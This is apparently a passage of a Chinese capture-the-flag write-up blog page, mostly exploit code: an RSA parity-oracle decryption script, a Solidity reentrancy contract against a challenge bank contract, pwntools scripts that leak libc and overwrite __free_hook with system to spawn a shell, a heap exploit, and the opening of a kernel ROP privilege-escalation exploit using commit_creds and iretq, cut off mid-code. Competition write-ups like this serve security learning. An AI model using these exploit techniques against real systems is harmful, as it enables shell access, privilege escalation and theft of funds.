<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = long_to_bytes(m)</span><br><span class="line">    m = base64.b64encode(m)</span><br><span class="line">    length = len(m)</span><br><span class="line">    r.recvuntil(<span class="string">'you can choose what you want here\n'</span>)</span><br><span class="line">    r.send(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'send how long you want to decrypt\n'</span>)</span><br><span class="line">    r.send(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">'send the message in base64 encode\n'</span>)</span><br><span class="line">    r.send(m)</span><br><span class="line">    r.recvuntil(<span class="string">'res:'</span>)</span><br><span class="line">    choice = r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'1'</span> == choice:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'0'</span> == choice:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'n:'</span>)</span><br><span class="line">    n = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    r.recvuntil(<span class="string">'e:'</span>)</span><br><span class="line">    e = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#e = 65537</span></span><br><span class="line">    r.recvuntil(<span class="string">'flag:'</span>)</span><br><span class="line">    c = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    m = partial((c * c_of_2) % n, n,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n,e)</span>:</span></span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        c += n*<span class="number">10</span>**<span class="number">2048</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">print</span> upper</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(upper)</span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line">challenge()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><h2 id="BlockChain-OwnerMoney"><a href="#BlockChain-OwnerMoney" class="headerlink" title="BlockChain-OwnerMoney"></a>BlockChain-OwnerMoney</h2><p>先弄四个结尾为0xfff的合约，然后把balance集中到一个合约<br>自毁给目标合约凑够400wei<br>然后就直接重入攻击即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract bank&#123;</span><br><span class="line">    function buy() public payable&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function change(address addr) public&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function sell(uint256 num) public&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address,uint256) public&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Anemone&#123;</span><br><span class="line">    address taddr = 0x40a590b70790930ceed4d148bf365eea9e8b35f4;</span><br><span class="line">    bank public target = bank(taddr);</span><br><span class="line">    uint public isOwner = 0;</span><br><span class="line">    uint public flag = 0;</span><br><span class="line">    uint public num = 200;</span><br><span class="line"></span><br><span class="line">    function Anemone() payable&#123;</span><br><span class="line">        uint256 addr = uint256(address(this));</span><br><span class="line">        if(addr&amp;0xfff!=0xfff)&#123;</span><br><span class="line">            selfdestruct(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setnum(uint256 n) public &#123;</span><br><span class="line">        num = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step1() public payable &#123;</span><br><span class="line">        target.buy.value(1 wei)();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step2() public payable&#123;</span><br><span class="line">        target.sell(num);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step3() public&#123;</span><br><span class="line">        target.change(target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function step4() public&#123;</span><br><span class="line">        taddr.call(0x11f776bc);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address addr) public&#123;</span><br><span class="line">        target.transfer(addr,100);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payflag(string email)&#123;</span><br><span class="line">        taddr.call(0x6bc344bc,0x20,0x18,email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function kill(address addr) public &#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function pay() public payable&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function isOwner(address addr) public returns (uint256)&#123;</span><br><span class="line">        if(isOwner!=1)&#123;</span><br><span class="line">            isOwner = 1;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;  </span><br><span class="line">        else</span><br><span class="line">            return 1;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if(msg.sender == taddr)&#123;</span><br><span class="line">            if(flag == 0)&#123;</span><br><span class="line">                flag = 1;</span><br><span class="line">                target.sell(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./EasyVM'</span>)</span><br><span class="line">    <span class="comment">#p=t.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'121.36.215.224'</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mbreak</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x99'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x71'</span>+p32(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x53'</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x76'</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span><span class="params">(idx,v)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x80'</span>+chr(idx)+p32(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ptr</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x11'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gift</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&amp;#92;x09'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">(s)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    se(s)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; &amp;#92;n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; &amp;#92;n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">shellcode = get_gift() + print_ptr() + mbreak()</span><br><span class="line">gift()</span><br><span class="line">enter(shellcode)</span><br><span class="line">start()</span><br><span class="line">pbase = int(ru(<span class="string">'&amp;#92;n'</span>),<span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; &amp;#92;n'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    shellcode += mov(<span class="number">3</span>, pbase+ <span class="number">0x2FDC</span>+i) + putchr()</span><br><span class="line">shellcode += mbreak()</span><br><span class="line">enter(shellcode)</span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line">libc = u32(ru(<span class="string">'1.'</span>)[:<span class="number">-2</span>])</span><br><span class="line">base = libc - <span class="number">0x18540</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; &amp;#92;n'</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">shellcode = mov(<span class="number">6</span>, base + e.symbols[<span class="string">'__free_hook'</span>] +<span class="number">4</span>) + push(base + e.symbols[<span class="string">'system'</span>]) + mov(<span class="number">10</span>, base+e.search(<span class="string">'/bin/sh'</span>).next())+ mbreak()</span><br><span class="line">enter(shellcode)</span><br><span class="line">start()</span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; &amp;#92;n'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(pbase))</span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Shotest-Path-v2"><a href="#Shotest-Path-v2" class="headerlink" title="Shotest_Path_v2"></a>Shotest_Path_v2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./Shortest_path'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'121.37.181.246'</span>, <span class="number">19008</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id,price,sz,name,connection=[])</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'ID:'</span>)</span><br><span class="line">    sl(str(id))</span><br><span class="line">    ru(<span class="string">'Price:'</span>)</span><br><span class="line">    sl(str(price))</span><br><span class="line">    ru(<span class="string">'Length:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Name:'</span>)</span><br><span class="line">    se(name)</span><br><span class="line">    ru(<span class="string">'station:'</span>)</span><br><span class="line">    sl(str(len(connection)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> connection:</span><br><span class="line">        ru(<span class="string">'ID:'</span>)</span><br><span class="line">        sl(str(i[<span class="number">0</span>]))</span><br><span class="line">        ru(<span class="string">'distance:'</span>)</span><br><span class="line">        sl(str(i[<span class="number">1</span>]))</span><br><span class="line">ru(<span class="string">'---&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'ID:'</span>)</span><br><span class="line">    sl(str(id))</span><br><span class="line">    ru(<span class="string">'---&gt;'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'---&gt;'</span>)</span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    tt.append((i,<span class="number">-1</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x27</span>,<span class="string">'a'</span>,[(<span class="number">1</span>,<span class="number">-2</span>)])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x27</span>,<span class="string">'b'</span>,tt)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    add(i+<span class="number">11</span>,<span class="number">3</span>,<span class="number">0x27</span>,<span class="string">'c'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">29</span>)</span><br><span class="line">add(<span class="number">40</span>,<span class="number">2</span>,<span class="number">0x17</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6068E0</span>))</span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'ID:'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'ID:'</span>)</span><br><span class="line">sl(<span class="string">'28'</span>)</span><br><span class="line">ru(<span class="string">'---&gt;'</span>)</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'ID:'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babykernel"><a href="#babykernel" class="headerlink" title="babykernel"></a>babykernel</h2><p>非预期解。。搜索flag即可<br><img src="https://i.loli.net/2020/03/10/ogxfDcGTHZXpbrW.png" alt="babykernel.png"><br>内容</p>
<h2 id="babykernel2"><a href="#babykernel2" class="headerlink" title="babykernel2"></a>babykernel2</h2><p>存在整数溢出，然后有canary，常规的泄漏canary然后rop回到用户态即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;assert.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;signal.h&gt;</span></span><br><span class="line">// <span class="number">0xffffffff810779b0</span> prepare_kernel_cred</span><br><span class="line">// <span class="number">0xffffffff81077620</span> commit_creds</span><br><span class="line">//<span class="number">0xffffffff811b771d</span> : pop rdi ; ret</span><br><span class="line">//<span class="number">0xffffffff8122f802</span> : pop rdx ; ret</span><br><span class="line">//<span class="number">0xffffffff810aa626</span> : mov rdi, rax ; call rdx</span><br><span class="line">//<span class="number">0xffffffff813345db</span> : swapgs ; pop rbp ; ret</span><br><span class="line">//<span class="number">0xffffffff818e8977</span>:   <span class="number">48</span> cf                   iretq</span><br><span class="line">unsigned long cmd1 = <span class="number">0x30001</span>;</span><br><span class="line">unsigned long cmd2 = <span class="number">0x30002</span>;</span><br><span class="line">unsigned long cmd3 = <span class="number">0x30000</span>;</span><br><span class="line">unsigned long base = <span class="number">0</span>;</span><br><span class="line">unsigned long prepare_kernel_cred;</span><br><span class="line">unsigned long commit_creds;</span><br><span class="line">unsigned long p_rdi;</span><br><span class="line">unsigned long p_rdx;</span><br><span class="line">unsigned long swapgs_rbp;</span><br><span class="line">unsigned long iretq;</span><br><span class="line">unsigned long mov_ca;</span><br><span class="line">size_t user_cs, user_ss, user_eflags, user_sp;</span><br><span class="line">void save_stats() &#123;</span><br><span class="line">asm(</span><br><span class="line">    <span class="string">"movq %%cs, %0&amp;#92;n"</span></span><br><span class="line">    <span class="string">"movq %%ss, %1&amp;#92;n"</span></span><br><span class="line">    <span class="string">"movq %%rsp, %3&amp;#92;n"</span></span><br><span class="line">    <span class="string">"pushfq&amp;#92;n"</span></span><br><span class="line">    <span class="string">"popq %2&amp;#92;n"</span></span><br><span class="line">    :<span 